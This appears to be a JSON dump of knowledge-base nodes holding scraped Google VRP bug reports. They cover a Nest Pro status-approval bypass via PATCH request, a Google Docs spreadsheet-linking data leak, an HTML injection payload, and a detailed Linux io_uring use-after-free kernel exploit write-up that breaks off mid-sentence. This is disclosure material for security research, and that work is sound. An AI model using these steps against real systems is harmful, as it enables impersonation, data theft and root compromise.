them immediate access to the Nest Pro Portal.\r\nSteps to reproduce:\r\nGo to\r\nhttps://nest.google.com/pro\r\nand sign in with a Google account.\r\nFill out the application with any information that is required, it doesn't matter what you put in.\r\nBefore accepting the agreement and submitting the application, open the developer tools on your \r\nbrowser to monitor the network traffic.\r\nSubmit the application. You should see a POST request to\r\nhttps://alkalinestproportal-pa.clients6.google.com/batch\r\nwith the request body containing\r\nPOST /v1/organizations\r\n. The page should say \"Your application has been submitted.\" The response will have a JSON object with a\r\nname\r\nkey and a value in the format\r\norganizations/{A random UUID}\r\n. Copy that value.\r\nWrite a script or use a tool to compose a PATCH request of type\r\napplication/json\r\nto\r\nhttps://alkalinestproportal-pa.clients6.google.com/v1/organizations/{that same random UUID, no braces}?key=AIzaSyB0zqBEgW20NpNH9LhRcceIuwVTp8flu-c&alt=json&updateMask=status\r\n. (The API key is lifted from the previous request.)\r\nReuse the\r\nCookie\r\nand\r\nOrigin\r\nheaders from the previous request, and the\r\nAuthorization\r\nheader from the body of the previous request.\r\nSet the body of the PATCH request to\r\n{\"status\": \"APPROVED\"}\r\n.\r\nSend the request.\r\nExpected behavior:\r\nThe server returns an error that the\r\nstatus\r\nfield cannot be edited, or returns 200 OK without making any changes.\r\nActual behavior:\r\nThe server returns 200 OK with the body of the response showing\r\nstatus\r\nset to\r\nAPPROVED\r\n. The user receives an email with the subject line \"Welcome to Google Nest Pro!\"\r\nPoC:\r\norganizations/0bf0c21a-ac86-4e70-b7e3-2490e27d1f86\r\n, Pro ID\r\nD99F66\r\n.\r\nAttack scenario\r\nThe verification process is in place to ensure that Nest Pros are actually affiliates of the businesses they say, not impersonators, and to check any provided licensure/certification that the Nest Pro may need to install certain devices safely and securely, such as Nest Detect and related security devices, or the Nest x Yale lock.\r\nThis bug would allow a malicious actor to create a Nest Pro organization that impersonates Google or another company, and mark it as certified to install devices that they do not have the qualifications for. It opens up an avenue to abuse user trust in Nest Pro for scam/fraud purposes. Illegitimate members may also try to claim their own devices for rewards or spoof device registrations to rack up credit.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3450, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2461d92c-7436-49b0-8947-b0bc0751ab94": {"__data__": {"id_": "2461d92c-7436-49b0-8947-b0bc0751ab94", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.txt", "file_name": "20250408_175701_072076.txt", "file_type": "text/plain", "file_size": 3421, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a475e062-4680-4817-ada9-8b9172e5d14c", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.txt", "file_name": "20250408_175701_072076.txt", "file_type": "text/plain", "file_size": 3421, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3061a679dec7bf1fbdfd13fd54d124625aec7e1f667f454f630142b96a0aa003", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nArbitrary sheet linking in Google Docs leads to a convincing one-click data leak\r\nReported by:\r\nRebane\r\nGoogle VRP\r\ntriaged\r\n21:57 | Dec 19, 2022\r\naccepted\r\n03:29 | Dec 20, 2022\r\nfixed\r\n22:55 | Aug 9, 2023\r\nreward decided\r\n$1,337\r\nSummary:\r\nArbitrary sheet linking in Google Docs leads to a convincing one-click data leak\r\nProduct:\r\nGoogle Docs Editors\r\nURL:\r\nhttps://docs.google.com/document/u/0/\r\nVulnerability type:\r\nInformation Leak\r\nDetails\r\nSummary\r\nGoogle Docs has a feature which lets you link/embed any Docs spreadsheet (or slide) inside of a document or slide. By using a web proxy, it is possible for an attacker to link to any spreadsheet, even if they don't have access to it. When someone with access to the spreadsheets visits the attacker's document, they are presented with an \"UPDATE\" button. Clicking the button will fetch the contents of the spreadsheet and include them inside of the document, which the attacker can retrieve.\r\nBasic repro\r\nA basic attack isn't very convincing, but works as a minimal test case:\r\nMake sure you have the id/url of a spreadsheet you don't have access to.\r\nCreate a spreadsheet and copy a part of it to the clipboard.\r\nCreate a document and paste the table you copied, pick the \"Link to spreadsheet\" option.\r\nCapture the POST request to\r\n.../save\r\nusing a web proxy\r\nIn the POST request, find and replace the ID of the spreadsheet your created with the ID of the spreadsheet you are targeting.\r\nShare the document with a person who has access to the target spreadsheet. Upon opening the document, they should see an \"UPDATE\" button, which when clicked will include the data from the spreadsheet inside the document you have access to.\r\nThis repro is also demonstrated in the attached\r\ndemo_basic.webm\r\nvideo.\r\nImproved PoC\r\nGoogle Docs allows for many formatting options that can be used to make this attack more convincing. As a PoC, I made a document where the linked table was moved way off-screen and had extra columns added. An image was added on the table that spoofs a notification asking the user to update the document to see the latest version. The image cannot be selected or moved.\r\nUpon clicking the \"UPDATE\" button, the extra columns with the image will disappear and it seems to the user like they just dismissed a notification, while the document will now contain the spreadsheet data off-screen.\r\nI don't think step-by-step instructions for this scenario are necessary as it is just the basic repro shown above with some creative Docs formatting added to it. This PoC is demonstrated in the attached\r\ndemo_advanced.webm\r\nvideo, the hidden table contents are shown by copy-pasting them into the URL-bar.\r\nPlaying around with this I also found it to be possible to put the entire table outside of the document, leading to a floating \"UPDATE\" button with no context, as can be seen in\r\ndemo_outside.png\r\n.\r\nAttack scenario\r\nA malicious actor that is already aware of a Google Docs spreadsheet (or slide) url/ID can craft a malicious document, which when opened by victim who clicks an \"UPDATE\" button leads to the leak of the targeted spreadsheet or slide.\r\nIn short:\r\nThe attacker needs to know the ID of a private spreadsheet.\r\nThe victim has to open a document and click on a button labeled \"UPDATE\".\r\nThe attacker receives the contents of the private spreadsheet.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3405, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "44a75834-e9ba-44ca-aa2c-d767ef06d5ce": {"__data__": {"id_": "44a75834-e9ba-44ca-aa2c-d767ef06d5ce", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.txt", "file_name": "20250408_175701_103526.txt", "file_type": "text/plain", "file_size": 1552, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e109ca46-30b3-4a43-99f7-6cdeebb7648f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.txt", "file_name": "20250408_175701_103526.txt", "file_type": "text/plain", "file_size": 1552, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6a5e87d009ddf4629923951a507a4f47cb46324e0e4687f1dc081d3f4329bd32", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nHTML INJECTION\r\nReported by:\r\nVaidik Pandya\r\nGoogle VRP\r\naccepted\r\n21:41 | Dec 9, 2022\r\nfixed\r\n18:51 | Dec 24, 2022\r\nGoogle comment\r\nThis report was not rewarded as the described impact of the HTML injection was not accurate (the real impact was minimal).\r\nSummary:\r\nHTML INJECTION\r\nProduct:\r\nhttps://bughunters.google.com\r\nURL:\r\nhttps://bughunters.google.com\r\nVulnerability type:\r\nOther\r\nDetails\r\nName: [REDACTED_NAME]\r\nEmail: [REDACTED_EMAIL_ADDRESS]\r\nVulnerability Name : HTML INJECTION\r\nVulnerable Domain :\r\nhttps://bughunters.google.com/\r\nWhat is HTML INJECTION?\r\nHypertext Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify a web page presented by a web application to its users. When applications fail to validate user data, an attacker can send HTML-fomatted text to modify site content that gets presented to other users.\r\nSteps to Reproduce:\r\nCreate a account on\r\nhttps://bughunters.google.com\r\nand fill details until it ask for the impact and other details\r\nEnter the text as payload herr i used <img src=http://tny.im/tK->\r\nand in review section you will see this.\r\nReferences:\r\nhttps://hackerone.com/reports/1081656\r\nAttack scenario\r\nIMPACT:\r\nIt can allow an attacker to modify the page. To steal another person's identity. The attacker discovers injection vulnerability and decides to use an HTML injection attack.\r\nPlanned disclosure date:\r\nSun Jan 01 2023 00:00:00 GMT+0530 (India Standard Time)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1536, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "61303b7b-e3a6-49c1-a645-1fafe2c3f5de": {"__data__": {"id_": "61303b7b-e3a6-49c1-a645-1fafe2c3f5de", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b9fa964e-8184-4a91-a33b-114343d438e0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "7046e90b-5885-47da-9090-6df80c0d95d1", "node_type": "1", "metadata": {}, "hash": "58dbf972d21fe849609bddfa671978a299ec5759f34ee397ce4059ce9fb90224", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Linux Kernel\r\nReported by:\r\nDavid Bouman\r\nGoogle VRP\r\ntriaged\r\n22:55 | Dec 8, 2022\r\naccepted\r\n22:35 | Dec 20, 2022\r\nfixed\r\n22:35 | Dec 20, 2022\r\nreward decided\r\n$113,337\r\nSummary: kCTF exploit #23 & #24 - exp23_David & exp24_David (CVE-2022-2602, 5.10+5.19, io_uring registered file GC UAF)\r\n5.10 submission:\r\nhttps://drive.google.com/open?id=15RnqvCDcMmiHy0AmlCXXS4JzRuQaWB4E\r\n5.19 submission:\r\nhttps://drive.google.com/open?id=1OTXiTq8D8yxkhUSfZghpwJ6aCBp7ycHi\r\nexploit for COS linux, v5.10.123+, 11th of september 2022\r\nby: [REDACTED_NAME]\r\nio_uring instances can hold so-called \"fixed files\" internally, which subsequent requests can use.\r\nyou can register a bunch of them with io_uring_register and IO_URING_REGISTER_FILES.\r\nthis functionality poses a problem, because you can now create file reference loops.\r\nAF_UNIX sockets also have this functionality (through SCM_RIGHTS), and they use\r\na garbage collection algorithm that can resolve these cycles and properly free the resources.\r\nio_uring lifts off of this garbage collector (GC), by internally registering a AF_UNIX socket\r\nand additionally keeping all these fixed files in its socket buffers, instead of only in\r\nits fixed file buffer (which is the only reasonable way to access the files performantly).\r\nyou can read more about the workings of the unix socket GC here:\r\n     -\r\nhttps://lwn.net/Articles/779472/\r\n-\r\nhttps://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html\r\nthe bug is that even if a file is garbage-eligible, it can still be in use, through an asynchro-\r\nnous io_uring request. in this case, the file will get freed, because for the GC, the file is in a\r\nreference cycle and therefore it needs to be dealt with. the use-after-free condition can be reached\r\nin two ways: either a prepared request has already set its\r\nfile\r\nfield to the \"victim\" file, but is\r\nnot executing yet, OR a file is dynamically taken from the fixed file table when the request is executing.\r\nthe latter only applies to requests that use several files, like IORING_OP_TEE and IORING_OP_SPLICE.\r\nfor this exploit, the\r\nunix_scm_cycle_create\r\nfunction contains the logic for creating such a reference\r\ncycle. it contains comments that are useful for understanding the bug better.\r\nnote that the io_uring instance must necessarily not be reachable from userspace anymore before the GC\r\ncan trigger (it is not a reference cycle otherwise). however, we can queue up an semi-arbitrary amount\r\nof requests that will still be executed anyhow, only limited by RLIMIT_MEMLOCK.\r\nwe can (ab)use so-called \"linked requests\", requests that will execute in a serialized manner.\r\nthat is to say, if we have A linked with B, B will only execute once A has finished. by having request A\r\nblock on a pipe/socket, we can dictate exactly when request B will get executed. if B happens\r\nto be configured to operate on a fixed file we freed with the bug, this translates\r\nto an UAF that can get triggered whenever we want! we can create long sequences of linked requests,\r\ncalled \"chains\", but if you have multiple chains queued, they will still execute concurrently.\r\nby using the blocking sequence trick above, we can create a chain that alternates between\r\na blocking operation and an operation that acts on the victim object. you can see the latter\r\nas a custom \"instruction\" for a weird machine, and writing to the former is akin to incrementing\r\nthe instruction pointer :p\r\nwe're going to have to constantly rewrite the victim object, and with existing primitives this\r\nmeans a lot of reallocation, a lot of allocator races and a lot of bad stuff. therefore, i've\r\ndeveloped a new technique, one i would like to kindly nominate for the \"novel technique\" VRP bonus.\r\nafter releasing the pages of the victim object's slab back to the page allocator using standard techniques,\r\nwe can reallocate them as io_uring rings/sqes.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3949, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7046e90b-5885-47da-9090-6df80c0d95d1": {"__data__": {"id_": "7046e90b-5885-47da-9090-6df80c0d95d1", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b9fa964e-8184-4a91-a33b-114343d438e0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "61303b7b-e3a6-49c1-a645-1fafe2c3f5de", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "9f3167327f3b44b877b2c3c50f1c3a6d6a7cdbcdddbaf38ff98d746d9b235241", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "60db438d-0758-4d43-9539-4437737af871", "node_type": "1", "metadata": {}, "hash": "e0aafd5553b8b049bb9db12a3eb49497324d18cf1647c6ea9db75ce053f5152a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "we can create long sequences of linked requests,\r\ncalled \"chains\", but if you have multiple chains queued, they will still execute concurrently.\r\nby using the blocking sequence trick above, we can create a chain that alternates between\r\na blocking operation and an operation that acts on the victim object. you can see the latter\r\nas a custom \"instruction\" for a weird machine, and writing to the former is akin to incrementing\r\nthe instruction pointer :p\r\nwe're going to have to constantly rewrite the victim object, and with existing primitives this\r\nmeans a lot of reallocation, a lot of allocator races and a lot of bad stuff. therefore, i've\r\ndeveloped a new technique, one i would like to kindly nominate for the \"novel technique\" VRP bonus.\r\nafter releasing the pages of the victim object's slab back to the page allocator using standard techniques,\r\nwe can reallocate them as io_uring rings/sqes. these can be mapped to userspace directly, which means that\r\nyou have \"live\" access to the freed victim file! in our case, the order of the file slab is 1 (so 2 pages),\r\nbut the technique can be used for objects of any size.\r\nrelevant code in io_uring.c:\r\n8081    static void *io_mem_alloc(size_t size)\r\n 8082    {\r\n 8083        gfp_t gfp_flags = GFP_KERNEL | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP |\r\n 8084        __GFP_NORETRY;\r\n 8085\r\n 8086        return (void *) __get_free_pages(gfp_flags, get_order(size));\r\n 8087    }\r\n ----\r\n 9255    static int io_allocate_scq_urings(struct io_ring_ctx *ctx,\r\n 9256            struct io_uring_params *p)\r\n 9257    {\r\n 9258        struct io_rings *rings;\r\n        9259        size_t size, sq_array_offset;\r\n        9260        \r\n        9261        // make sure these are sane, as we already accounted them\r\n 9262        ctx->sq_entries = p->sq_entries;\r\n 9263        ctx->cq_entries = p->cq_entries;\r\n 9265\r\n        9264        size = rings_size(p->sq_entries, p->cq_entries, &sq_array_offset);\r\n        9265        if (size == SIZE_MAX)\r\n        9266            return -EOVERFLOW;\r\n 9267\r\n 9268        r\u0333i\u0333n\u0333g\u0333s\u0333 \u0333=\u0333 \u0333i\u0333o\u0333_\u0333m\u0333e\u0333m\u0333_\u0333a\u0333l\u0333l\u0333o\u0333c\u0333(\u0333s\u0333i\u0333z\u0333e\u0333)\u0333;\u0333\r\n 9269        if (!rings)\r\n 9270            return -ENOMEM;\r\n 9271        \r\n 9272        ctx->rings = rings;\r\n ....        [...]\r\n 9282        size = array_size(sizeof(struct io_uring_sqe), p->sq_entries);\r\n 9283        if (size == SIZE_MAX) {\r\n 9284            io_mem_free(ctx->rings);\r\n 9285            ctx->rings = NULL;\r\n 9286            return -EOVERFLOW;\r\n 9287        }\r\n 9288\r\n 9289        c\u0333t\u0333x\u0333-\u0333>\u0333s\u0333q\u0333_\u0333s\u0333q\u0333e\u0333s\u0333 \u0333=\u0333 \u0333i\u0333o\u0333_\u0333m\u0333e\u0333m\u0333_\u0333a\u0333l\u0333l\u0333o\u0333c\u0333(\u0333s\u0333i\u0333z\u0333e\u0333)\u0333;\u0333\r\n 9290        if (!ctx->sq_sqes) {\r\n 9291            io_mem_free(ctx->rings);\r\n 9292            ctx->rings = NULL;\r\n 9293            return -ENOMEM;\r\n 9294        }\r\n 9295\r\n 9296        return 0;\r\n 9297    }\r\nctx->rings and ctx->sq_sqes can then be readily allocated by calling\r\n mmap on the file descriptor returned by io_uring_setup.\r\nto my knowledge, this method has not been publicly published before.\r\nthere's some very nice benefits:\r\nsince this is exactly the slab that the file laid on, we don't have to deal with alignment issues.", "mimetype": "text/plain", "start_char_idx": 3045, "end_char_idx": 6156, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "60db438d-0758-4d43-9539-4437737af871": {"__data__": {"id_": "60db438d-0758-4d43-9539-4437737af871", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b9fa964e-8184-4a91-a33b-114343d438e0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "7046e90b-5885-47da-9090-6df80c0d95d1", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0fd9775126091b45d544a543e4adc3d070cde52321ff88879f069937e1d94b5e", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "8935791f-c72f-44d8-93cf-e573c7e740ab", "node_type": "1", "metadata": {}, "hash": "16515d0d2905676bc3e9d21da31511290a0f55c58a99e2c4816a746164b64516", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "to my knowledge, this method has not been publicly published before.\r\nthere's some very nice benefits:\r\nsince this is exactly the slab that the file laid on, we don't have to deal with alignment issues.\r\nyou can take a forged object, project it along the shared memory, and be sure that your forged fields\r\nare at the offsets you want them to. additionally, there's no object headers that can pollute the\r\nvictim's state (and force a crash.)\r\nyou don't have to deal with allocator races. every time you reallocate,\r\nthere is a chance another allocation in the same slab will snatch the victim object away, which will\r\nlikely cause a crash, or otherwise requires you to re-trigger the vulnerability. this issue very prevalent\r\nif the target is running production workloads. the fact that the memory comes directly from the page allocator\r\nis also relevant here, because if multiple free pages are on the page allocator freelist, you would have to\r\nspray many more slab objects than pages, comparatively, which translates to more races.\r\nit is semi-practical to inject TOCTOU-type bugs in code that uses the victim object, because you can alter\r\nthe state of the forged object in real time. this can be useful in niche situations to force further memory\r\ncorruption.\r\nalso note that the primitive does not require special privileges. the implementation is simple, it can be found\r\nin the section labeled \"uring_spray.c\"\r\nif had not used this primitive, i would have had to first re-trigger the vulnerability numerous times to ensure\r\nthat freed file properly aligned with my spray and hope that previous attempts did not cause a crash. once successful,\r\ni would have had to reallocate the correct object some 250+ times successfully without a single allocator race occuring.\r\nall of this would drastically decrease the reliability of the exploit (which now has an acceptable baseline reliability\r\nof around 80-90% on my machine)\r\n--\r\nPROBE STAGE:\r\nback to the exploit, we've already queued up a chain that starts on a blocking operation, and an IORING_OP_SPLICE\r\nrequest (S) that will read from a pipe end and write to the victim fixed file, which has been freed.\r\nR is soft-linked with IOSQE_LINK, which means that it will only execute if S succeeds (i.e. does not return an error.)\r\nafter spraying a few pages with the io_uring spray primitive, we also allocate numerous memfd files. we make sure to project\r\na forged file with ->flags & FMODE_WRITE == 0 to the ring buffers. then we execute S by unblocking its link.\r\nif for some reason our cross-cache attempt failed, and we could not reallocate the victim slab as the shared memory,\r\nthe victim object could surely be reallocated as another file, which would likely be one of our memfds.\r\nthis adds an useful diagnostic: if we lseek all of the memfds, and one of its positions is NOT 0, this means\r\nthat it was reallocated at the address of the victim object, and therefore the cross-cache attempt failed.\r\nif it succeeded however, it would error early, because we forged the new object to not be writable. erroring\r\nearly is essential, because otherwise we cannot forge the necessary state to not crash.\r\nKERNEL LEAK STAGE:\r\nok, we probably have full control over the freed file now. sadly, there's no easy way to get a kernel leak.\r\ni had to come up with a pretty contrived bruteforce method. also, note how at this point we cannot submit\r\nnew requests, all of them have to be queued up in advance. additionally cannot look at results, because we had\r\nto unmap the CQ ring to trigger the bug.\r\nthe IORING_OP_RECV and IORING_OP_RECVMSG operations require a valid socket file to operate, and will fail otherwise.\r\nthis is determined by checking if file->f_op == &socket_file_operations - a kernel pointer. by queueing up 256 separate\r\nIORING_OP_RECVMSG requests R_i, separated by a blocking request, we can keep changing the file's f_op field until it matches\r\n&socket_file_operations. sadly, we don't have enough information to forge a file that can make the request succeed - if\r\nwe could do this, we could soft-link (IOSQE_LINK) a next request that would only run when the attempt succeeded, and thereby\r\ndetermine which byte the base kernel address is randomized with. RIP, it would have been a nice technique.\r\nio_uring's provided buffers (IORING_OP_PROVIDE_BUFFERS) are the saving grace.", "mimetype": "text/plain", "start_char_idx": 5954, "end_char_idx": 10300, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8935791f-c72f-44d8-93cf-e573c7e740ab": {"__data__": {"id_": "8935791f-c72f-44d8-93cf-e573c7e740ab", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b9fa964e-8184-4a91-a33b-114343d438e0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "fbfd3e9332cbf1b53eb1ccb8d2eb3826986558a17223d67eeeba645604537edc", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "60db438d-0758-4d43-9539-4437737af871", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_150694.txt", "file_name": "20250408_175701_150694.txt", "file_type": "text/plain", "file_size": 13689, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7eff01af9e3810cc7d0e9ef376ad7d34840e513adf60a83088c95f6da6876347", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "0c1db893-9181-40aa-81ab-40f7cf6bd643", "node_type": "1", "metadata": {}, "hash": "954dc43b8c6c9d7fd1d15d7e37e0ee5c37e0bdac08055fe446aeea0309ebfde7", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "the IORING_OP_RECV and IORING_OP_RECVMSG operations require a valid socket file to operate, and will fail otherwise.\r\nthis is determined by checking if file->f_op == &socket_file_operations - a kernel pointer. by queueing up 256 separate\r\nIORING_OP_RECVMSG requests R_i, separated by a blocking request, we can keep changing the file's f_op field until it matches\r\n&socket_file_operations. sadly, we don't have enough information to forge a file that can make the request succeed - if\r\nwe could do this, we could soft-link (IOSQE_LINK) a next request that would only run when the attempt succeeded, and thereby\r\ndetermine which byte the base kernel address is randomized with. RIP, it would have been a nice technique.\r\nio_uring's provided buffers (IORING_OP_PROVIDE_BUFFERS) are the saving grace. you can submit these provided buffers,\r\nwhich are associated with a \"group id\", and then use this id with a IORING_OP_RECV(MSG) operation to select a buffer\r\ndynamically. these buffers can only be used once - they are removed from the table once they are looked up.\r\nchance has it that io_recvmsg will look up this buffer\r\nafter\r\nthe &socket_file_operations check, removing it from the table.\r\nby first providing 256 buffers group ids\r\ni\r\nfrom 0-255, and then adding an additional IORING_OP_RECV request\r\nafter R_\r\ni\r\nthat reads to provided buffer\r\ni\r\nfrom a socket, we know that if we execute the next \"instruction\"\r\nand something was written to the backing buffer of the provided buffer, our try did NOT equal &socket_file_operations.\r\none remaining question is how we can make io_recvmsg error without causing a crash - easy, in __sys_recvmsg_sock,\r\n!(file->f_private->ops->flags & PROTO_CMSG_DATA_ONLY) will make the operation error our early. if we got to\r\nthis point, our guess was necessarily correct, so in this case we\r\ncan\r\nforge f_private to point to something\r\nmeaningful that will satisfy this condition.\r\nthe stars aligned on this one - if we change the forged file to use a guessed byte x, execute the next \"instruction\"\r\nby unblocking the blocker, and did not register a value written to the user buffer, we know that x MUST necessarily be\r\nthe correct guess. essentially, we've programmed a side-channel address leak into our weird machine!\r\nRLIMIT_MEMLOCK of 64KiB prevented me from submitting long chains, so i used 16 separate chains, trying 16 candidates each.\r\nHEAP LEAK STAGE:\r\nany remaining \"operations\" can be done with a forged file that points to known memory, but not yet\r\ncontrolled\r\nmemory. without leaking the address of our controlled data (the shared mapping), we still don't really seem to have\r\nenough control to get the root shell. doing this is not that hard, but finding a sufficient gadget took some time.\r\nin the meantime, we also have 4 chains that each contains 16 \"instructions\" queued up, this time for IORING_OP_FADVISE,\r\nwhich will call file->f_op->fadvise(file, a, b, c) for us.\r\nin net/core/dev.c, we have the following:\r\n11156   static struct pernet_operations __net_initdata netdev_net_ops = {\r\n 11157       .init = netdev_init,\r\n 11158       .exit = netdev_exit\r\n 11159   }\r\nwhere netdev_init will perform\r\nINIT_LIST_HEAD(&net->dev_base_head);\r\n.\r\nnet\r\nis the first argument, so a pointer\r\nto our forged file. we can set the forged f_op->f_advise to point to netdev_init, execute the \"instruction\"\r\nand then read the new pointer (to its own address) back again through the shared mapping. victory is coming close..\r\nthe address.\r\nPWN STAGE:\r\nwe can forge 